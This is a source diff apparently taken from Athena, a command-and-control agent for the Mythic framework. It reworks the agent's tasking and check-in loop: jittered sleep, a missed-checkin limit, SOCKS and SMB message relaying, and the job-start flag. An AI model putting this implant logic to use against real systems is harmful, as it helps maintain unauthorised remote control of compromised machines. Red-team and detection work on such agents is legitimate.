@@ -35,7 +35,6 @@ namespace Athena
             missedCheckins = 0;
 
             //Main Loop
-            //Need to add the missed checkins check here.
             while (!(missedCheckins == maxMissedCheckins) & !exit)
             {
                 try
@@ -43,20 +42,16 @@ namespace Athena
                     List<MythicJob> hasoutput = Globals.jobs.Values.Where(c => c.hasoutput).ToList();
                     List<DelegateMessage> delegateMessages = Globals.mc.MythicConfig.smbForwarder.GetMessages();
                     List<SocksMessage> socksMessages = Globals.socksHandler.GetMessages();
-
                     if (!checkAgentTasks(hasoutput, delegateMessages, socksMessages))
                     {
                         missedCheckins += 1;
                         if (missedCheckins == maxMissedCheckins)
                         {
-                            Misc.WriteError("Max Checkins reached.");
                             Environment.Exit(0);
                         }
                         foreach (var job in hasoutput)
                         {
-                            //Return agents to queue for next go around.
                             Globals.jobs.Add(job.task.id, job);
-                            //Should I add delegate and socks messages back to their respective queues?
                         }
                     }
                     else
@@ -69,10 +64,8 @@ namespace Athena
                 catch (Exception e)
                 {
                     missedCheckins += 1;
-                    Misc.WriteError(e.Message);
                     if (missedCheckins == maxMissedCheckins)
                     {
-                        Misc.WriteError("Max Checkins reached.");
                         Environment.Exit(0);
                     }
                 }
@@ -91,11 +84,6 @@ namespace Athena
                 //Attempt checkin again
                 try
                 {
-                    res = Globals.mc.CheckIn();
-
-                    //Sleep before attempting checkin again
-                    Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter));
-
                     //Increment checkins
                     missedCheckins += 1;
 
@@ -105,12 +93,18 @@ namespace Athena
                         Misc.WriteError("Missed checkins reached.");
                         Environment.Exit(0);
                     }
+
+                    //Keep Trying
+                    res = Globals.mc.CheckIn();
                 }
                 catch (Exception e)
                 {
                     Misc.WriteError("[Checkin] " + e.Message);
                     continue;
                 }
+
+                //Sleep before attempting checkin again
+                Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter));
             }
             return res;
         }
@@ -134,7 +128,7 @@ namespace Athena
             }
             catch (Exception e)
             {
-                Misc.WriteError("[UpdateAgentInfo] " + e.Message);
+                Misc.WriteError(e.Message);
                 return false;
             }
         }
@@ -147,7 +141,7 @@ namespace Athena
             }
             catch (Exception e)
             {
-                Misc.WriteError("[Tasks] " + e.Message);
+                Misc.WriteError(e.Message);
                 return false;
             }
 
@@ -176,6 +170,7 @@ namespace Athena
                         {
                             try
                             {
+                                job.Value.started = true;
                                 CommandHandler.StartJob(job.Value);
                             }
                             catch (Exception e)
